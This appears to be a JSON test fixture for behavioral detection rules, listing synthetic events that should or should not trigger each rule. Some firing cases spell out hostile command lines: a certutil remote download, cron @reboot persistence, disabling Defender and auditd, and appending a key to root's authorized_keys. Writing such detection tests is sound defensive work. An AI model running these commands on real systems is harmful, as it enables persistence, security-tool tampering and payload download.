{
  "_comment": "Known-good (should_fire) and known-bad (should_not_fire) events for every behavioral rule in detections/behaviors/. Consumed by tests/test_behavior_replay.py through the same evaluator the runtime uses. All values are synthetic: RFC 5737/1918 addresses, invented hosts and users. Real vendor binary names appear only where the detection logic requires them (they are public product names, not attack content), and no entry contains a runnable attack command line. Every rule ships at least three should_not_fire cases, including deliberate near-misses that prove the filter and AND-clauses work.",
  "auditd_stopped": {
    "should_fire": [
      {
        "activity": "daemon_end"
      },
      {
        "activity": "daemon_abort"
      }
    ],
    "should_not_fire": [
      {
        "activity": "daemon_start"
      },
      {
        "activity": "service_stop"
      },
      {
        "activity": "syscall"
      }
    ]
  },
  "certutil_remote_download": {
    "should_fire": [
      {
        "command_line": "certutil -urlcache -f http://198.51.100.20/a",
        "parent_image": "cmd.exe",
        "image": "certutil"
      },
      {
        "command_line": "certutil.exe -verifyctl -f http://203.0.113.20/b",
        "parent_image": "cmd.exe",
        "image": "certutil.exe"
      }
    ],
    "should_not_fire": [
      {
        "command_line": "certutil -store my",
        "parent_image": "cmd.exe",
        "image": "certutil"
      },
      {
        "command_line": "certutil -dump cert.cer",
        "parent_image": "cmd.exe",
        "image": "certutil"
      },
      {
        "command_line": "curl -o out http://198.51.100.20/a",
        "parent_image": "cmd.exe",
        "image": "curl"
      },
      {
        "command_line": "certutil -hashfile payload.bin SHA256",
        "parent_image": "cmd.exe",
        "image": "certutil"
      }
    ]
  },
  "cron_reboot_persistence": {
    "should_fire": [
      {
        "command_line": "echo '@reboot /usr/bin/task' > /etc/cron.d/job",
        "user": "root"
      },
      {
        "command_line": "crontab -l ; echo @reboot /var/spool/cron/task",
        "user": "svc"
      }
    ],
    "should_not_fire": [
      {
        "command_line": "crontab -l",
        "user": "root"
      },
      {
        "command_line": "cat /etc/cron.d/existing",
        "user": "root"
      },
      {
        "command_line": "echo '@reboot task' >> /home/user/notes.txt",
        "user": "user"
      },
      {
        "command_line": "systemctl restart cron",
        "user": "root"
      }
    ]
  },
  "memfd_fileless_execution": {
    "should_fire": [
      {
        "activity": "memfd execution"
      }
    ],
    "should_not_fire": [
      {
        "activity": "syscall"
      },
      {
        "activity": "execve"
      },
      {
        "activity": "daemon_end"
      }
    ]
  },
  "office_app_spawns_shell": {
    "should_fire": [
      {
        "command_line": "cmd /c script",
        "image": "cmd.exe",
        "parent_image": "winword.exe"
      },
      {
        "command_line": "powershell -enc",
        "image": "powershell.exe",
        "parent_image": "excel.exe"
      },
      {
        "command_line": "mshta",
        "image": "mshta.exe",
        "parent_image": "outlook.exe"
      }
    ],
    "should_not_fire": [
      {
        "command_line": "cmd",
        "image": "cmd.exe",
        "parent_image": "explorer.exe"
      },
      {
        "command_line": "doc",
        "image": "winword.exe",
        "parent_image": "winword.exe"
      },
      {
        "command_line": "svc",
        "image": "svchost.exe",
        "parent_image": "services.exe"
      },
      {
        "command_line": "convert",
        "image": "excelcnv.exe",
        "parent_image": "excel.exe"
      }
    ]
  },
  "security_tool_tamper_command": {
    "should_fire": [
      {
        "command_line": "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
        "user": "svc-ops"
      },
      {
        "command_line": "sc stop windefend",
        "user": "admin"
      },
      {
        "command_line": "systemctl stop auditd",
        "user": "root"
      },
      {
        "command_line": "systemctl disable auditd",
        "user": "root"
      }
    ],
    "should_not_fire": [
      {
        "command_line": "systemctl status auditd",
        "user": "root"
      },
      {
        "command_line": "sc query windefend",
        "user": "admin"
      },
      {
        "command_line": "systemctl start auditd",
        "user": "root"
      },
      {
        "command_line": "powershell Get-MpPreference",
        "user": "admin"
      }
    ]
  },
  "ssh_authorized_keys_appended": {
    "should_fire": [
      {
        "command_line": "echo ssh-ed25519 AAAA >> /root/.ssh/authorized_keys",
        "user": "root"
      },
      {
        "command_line": "tee -a /home/svc/.ssh/authorized_keys",
        "user": "svc"
      }
    ],
    "should_not_fire": [
      {
        "command_line": "cat /root/.ssh/authorized_keys",
        "user": "root"
      },
      {
        "command_line": "ls -l /root/.ssh/",
        "user": "root"
      },
      {
        "command_line": "echo hello >> /tmp/notes",
        "user": "user"
      },
      {
        "command_line": "ssh-keygen -t ed25519",
        "user": "user"
      }
    ]
  }
}
